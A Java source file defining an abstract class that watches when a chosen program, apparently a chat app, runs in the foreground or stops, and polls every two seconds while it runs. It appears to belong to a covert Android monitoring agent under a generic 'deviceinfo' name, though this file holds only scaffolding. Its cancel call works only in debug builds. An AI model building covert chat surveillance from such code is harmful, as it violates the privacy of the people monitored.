package com.android.deviceinfo.module.chat;

import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.ProcessStatus;
import com.android.deviceinfo.RunningProcesses;
import com.android.deviceinfo.Standby;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.interfaces.Observer;
import com.android.deviceinfo.listener.ListenerProcess;
import com.android.deviceinfo.listener.ListenerStandby;
import com.android.deviceinfo.module.ModuleChat;
import com.android.deviceinfo.module.SubModule;
import com.android.deviceinfo.util.Check;

public abstract class SubModuleChat extends SubModule implements Observer<Standby> {

	private static final String TAG = "SubModuleChat";
	private ScheduledFuture future;
	RunningProcesses runningProcesses = new RunningProcesses();

	@Override
	protected void go() {

	}

	@Override
	protected void start() {

	}

	@Override
	protected void stop() {

	}
	
	@Override	
	protected void startListen() {
		ListenerStandby.self().attach(this);
	}
	
	@Override
	protected void stopListen() {
		ListenerStandby.self().detach(this);
	}

	@Override
	public int notification(Standby b) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification) standby " + b);
		}
		if (b.getStatus() == false) {
			ProcessInfo process = new ProcessInfo(runningProcesses.getForeground(), ProcessStatus.STOP);
			notification(process);
		} else {
			ProcessInfo process = new ProcessInfo(runningProcesses.getForeground(), ProcessStatus.START);
			notification(process);
		}
		return 0;
	}

	@Override
	public int notification(ProcessInfo process) {

		if (process.processInfo.contains(getObservingProgram())) {
			if (process.status == ProcessStatus.STOP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notification), observing found: " + process.processInfo);
				}
				if (future != null) {
					future.cancel(false);
				}
				notifyStopProgram(process.processInfo);

				return 1;
			} else {
				if (frequentNotification(process.processInfo)) {
					Runnable runnable = getFrequentRunnable(process.processInfo);
					if (runnable != null) {
						future = Status.getStpe().scheduleAtFixedRate(runnable, 0, 2, TimeUnit.SECONDS);

					}
					return 1;
				}
			}
		}
		return 0;
	}

	private Runnable getFrequentRunnable(final String processInfo) {
		return new Runnable() {

			@Override
			public void run() {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run) call frequentNotification " + processInfo);
				}
				if (!frequentNotification(processInfo) && future != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (run) kill stpe");

						future.cancel(false);
					}
				}

			}
		};
	}

	protected boolean frequentNotification(String processInfo) {
		return false;
	}

	protected ModuleChat getModule() {
		return (ModuleChat) module;
	}

	abstract void notifyStopProgram(String processName);

	abstract int getProgramId();

	abstract String getObservingProgram();
}
